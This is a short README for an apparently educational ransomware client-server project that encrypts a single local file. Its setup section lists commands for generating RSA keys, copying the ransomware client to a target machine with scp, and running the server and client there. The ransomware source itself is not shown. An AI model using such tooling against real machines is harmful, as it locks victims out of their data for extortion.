# ransomware-client-server    
## Table of content 
* [About the project](#about-the-project)  
* [Features](#features)  
* [Setup](#setup)  
## About the project  
>The script for a simple ransomware client and server build in few line . The script is writed to change a single file named `file.txt` in local dirrectory .  
### Disclaimer  
This was writed for a educational purpose , do not use it on someone else network/computer .   
## Features  
* The server can listen to  ***many*** host at once .  

## Setup  
```shell  
#setup shell cmd  
$git clone https://github.com/splitsploit/simple_rans0mw4r3.git
$cd ransomware-client-server 
#genrate rsa keys
$openssl genrsa -out private.pem 2948
$openssl rsa -in private.pem -pubout -out public.pem
#send public key and rasomware client to the target (using scp in this case)
$scp ransom.py public.pem hostname@xxx.xxx.xxx.xxx/path #the directory on target machine should have a file named file.txt 
#run the server then the client or multiple client 
$python3 ransomwareServer.py
$python3 ransom.py # on the target machine .
```

## Enjoy :)